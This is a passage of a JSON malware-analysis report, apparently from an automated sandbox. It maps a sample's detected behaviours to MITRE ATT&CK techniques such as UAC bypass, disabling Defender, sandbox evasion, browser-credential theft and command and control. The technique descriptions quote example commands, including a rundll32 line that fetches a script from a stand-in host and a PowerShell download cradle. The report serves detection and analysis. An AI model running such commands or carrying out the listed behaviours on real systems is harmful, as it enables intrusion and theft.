                    "description": "Creates an undocumented autostart registry key"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates an autostart registry key"
                  }
                ]
              },
              {
                "id": "T1548.002",
                "name": "Bypass User Account Control",
                "link": "https://attack.mitre.org/techniques/T1548/002/",
                "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\neventvwr.exe can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Disable Windows Defender real time protection (registry)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Disable Windows Defender notifications (registry)"
                  }
                ]
              },
              {
                "id": "T1055",
                "name": "Process Injection",
                "link": "https://attack.mitre.org/techniques/T1055/",
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May try to detect the Windows Explorer process (often used for injection)"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0005",
            "name": "Defense Evasion",
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "id": "T1548.002",
                "name": "Bypass User Account Control",
                "link": "https://attack.mitre.org/techniques/T1548/002/",
                "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\neventvwr.exe can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Disable Windows Defender real time protection (registry)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Disable Windows Defender notifications (registry)"
                  }
                ]
              },
              {
                "id": "T1055",
                "name": "Process Injection",
                "link": "https://attack.mitre.org/techniques/T1055/",
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May try to detect the Windows Explorer process (often used for injection)"
                  }
                ]
              },
              {
                "id": "T1562.001",
                "name": "Disable or Modify Tools",
                "link": "https://attack.mitre.org/techniques/T1562/001/",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging. \nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Modifies windows update settings"
                  },
                  {
                    "severity": "LOW",
                    "description": "Disable Windows Defender real time protection (registry)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Disable Windows Defender notifications (registry)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Disables Windows Defender"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates guard pages, often used to prevent reverse engineering and debugging"
                  }
                ]
              },
              {
                "id": "T1140",
                "name": "Deobfuscate/Decode Files or Information",
                "link": "https://attack.mitre.org/techniques/T1140/",
                "description": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows copy /b command to reassemble binary fragments into a malicious payload.\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": ".NET source code contains calls to encryption/decryption functions"
                  }
                ]
              },
              {
                "id": "T1027",
                "name": "Obfuscated Files or Information",
                "link": "https://attack.mitre.org/techniques/T1027/",
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Binary may include packed or crypted data"
                  }
                ]
              },
              {
                "id": "T1027.002",
                "name": "Software Packing",
                "link": "https://attack.mitre.org/techniques/T1027/002/",
                "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": ".NET source code contains method to dynamically call methods (often used by packers)"
                  },
                  {
                    "severity": "INFO",
                    "description": "PE file has section (not .text) which is very likely to contain packed code (zlib compression ratio < 0.011)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Binary may include packed or crypted data"
                  }
                ]
              },
              {
                "id": "T1036",
                "name": "Masquerading",
                "link": "https://attack.mitre.org/techniques/T1036/",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the user directory"
                  }
                ]
              },
              {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/",
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  },
                  {
                    "severity": "LOW",
                    "description": "Hides threads from debuggers"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains long sleeps (>= 3 min)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains capabilities to detect virtual machines"
                  },
                  {
                    "severity": "INFO",
                    "description": "Sleep loop found (likely to delay execution)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains medium sleeps (>= 30s)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks if the current process is being debugged"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks for debuggers (devices)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Checks for debuggers (window names)"
                  }
                ]
              },
              {
                "id": "T1218.011",
                "name": "Rundll32",
                "link": "https://attack.mitre.org/techniques/T1218/011/",
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. \nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"  This behavior has been seen used by malware such as Poweliks. \nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1).\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Runs a DLL by calling functions"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0007",
            "name": "Discovery",
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/",
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  },
                  {
                    "severity": "LOW",
                    "description": "Hides threads from debuggers"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains long sleeps (>= 3 min)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains capabilities to detect virtual machines"
                  },
                  {
                    "severity": "INFO",
                    "description": "Sleep loop found (likely to delay execution)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains medium sleeps (>= 30s)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks if the current process is being debugged"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks for debuggers (devices)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Checks for debuggers (window names)"
                  }
                ]
              },
              {
                "id": "T1046",
                "name": "Network Service Discovery",
                "link": "https://attack.mitre.org/techniques/T1046/",
                "description": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.   \nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as dns-sd -B _ssh._tcp .) to find other systems broadcasting the ssh service.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Sends SSDP (simple service discovery protocol) broadcast queries"
                  }
                ]
              },
              {
                "id": "T1083",
                "name": "File and Directory Discovery",
                "link": "https://attack.mitre.org/techniques/T1083/",
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads ini files"
                  },
                  {
                    "severity": "INFO",
                    "description": "Enumerates the file system"
                  }
                ]
              },
              {
                "id": "T1082",
                "name": "System Information Discovery",
                "link": "https://attack.mitre.org/techniques/T1082/",
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries the cryptographic machine GUID"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries a list of all running drivers"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the volume information (name, serial number etc) of a device"
                  },
                  {
                    "severity": "LOW",
                    "description": "Tries to evade debugger and weak emulator (self modifying code)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks the free space of harddrives"
                  },
                  {
                    "severity": "LOW",
                    "description": "Tries to detect virtualization through RDTSC time measurements"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks if Microsoft Office is installed"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries information about the installed CPU (vendor, model number etc)"
                  }
                ]
              },
              {
                "id": "T1518.001",
                "name": "Security Software Discovery",
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Tries to detect sandboxes / dynamic malware analysis system (registry check)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Hides threads from debuggers"
                  },
                  {
                    "severity": "INFO",
                    "description": "May try to detect the virtual machine to hinder analysis (VM artifact strings found in memory)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Tries to evade debugger and weak emulator (self modifying code)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Tries to detect virtualization through RDTSC time measurements"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains capabilities to detect virtual machines"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks if the current process is being debugged"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks for debuggers (devices)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Checks for debuggers (window names)"
                  }
                ]
              },
              {
                "id": "T1057",
                "name": "Process Discovery",
                "link": "https://attack.mitre.org/techniques/T1057/",
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries a list of all running processes"
                  },
                  {
                    "severity": "INFO",
                    "description": "May try to detect the Windows Explorer process (often used for injection)"
                  }
                ]
              },
              {
                "id": "T1010",
                "name": "Application Window Discovery",
                "link": "https://attack.mitre.org/techniques/T1010/",
                "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Sample monitors Window changes (e.g. starting applications), analyze the sample with the simulation cookbook"
                  }
                ]
              },
              {
                "id": "T1018",
                "name": "Remote System Discovery",
                "link": "https://attack.mitre.org/techniques/T1018/",
                "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or net view using Net.\nAdversaries may also analyze data from local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads the hosts file"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0006",
            "name": "Credential Access",
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
                "id": "T1003",
                "name": "OS Credential Dumping",
                "link": "https://attack.mitre.org/techniques/T1003/",
                "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Tries to harvest and steal browser information (history, passwords, etc)"
                  }
                ]
              },
              {
                "id": "T1056",
                "name": "Input Capture",
                "link": "https://attack.mitre.org/techniques/T1056/",
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates a DirectInput object (often for capturing keystrokes)"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0009",
            "name": "Collection",
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "id": "T1056",
                "name": "Input Capture",
                "link": "https://attack.mitre.org/techniques/T1056/",
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates a DirectInput object (often for capturing keystrokes)"
                  }
                ]
              },
              {
                "id": "T1560",
                "name": "Archive Collected Data",
                "link": "https://attack.mitre.org/techniques/T1560/",
                "description": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": ".NET source code contains calls to encryption/decryption functions"
                  }
                ]
              },
              {
                "id": "T1005",
                "name": "Data from Local System",
                "link": "https://attack.mitre.org/techniques/T1005/",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Found many strings related to Crypto-Wallets (likely being stolen)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Tries to harvest and steal browser information (history, passwords, etc)"
                  }
                ]
              },
              {
                "id": "T1114",
                "name": "Email Collection",
                "link": "https://attack.mitre.org/techniques/T1114/",
                "description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Tries to search for mail accounts"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0011",
            "name": "Command and Control",
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "id": "T1105",
                "name": "Ingress Tool Transfer",
                "link": "https://attack.mitre.org/techniques/T1105/",
                "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.\nAdversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts.\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Downloads files from webservers via HTTP"
                  },
                  {
                    "severity": "INFO",
                    "description": "Tries to download or post to a non-existing HTTP route (HTTP/1.1 404 Not Found / 503 Service Unavailable)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Downloads executable code via HTTP"
                  },
                  {
                    "severity": "INFO",
                    "description": "Some HTTP requests failed (404). It is likely that the sample will exhibit less behavior."
                  }
                ]
              },
              {
                "id": "T1573",
                "name": "Encrypted Channel",
                "link": "https://attack.mitre.org/techniques/T1573/",
                "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS for network communication, use the SSL MITM Proxy cookbook for further analysis"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  }
                ]
              },
              {
                "id": "T1571",
                "name": "Non-Standard Port",
                "link": "https://attack.mitre.org/techniques/T1571/",
                "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Detected TCP or UDP traffic on non-standard ports"
                  }
                ]
              },
              {
                "id": "T1095",
                "name": "Non-Application Layer Protocol",
                "link": "https://attack.mitre.org/techniques/T1095/",
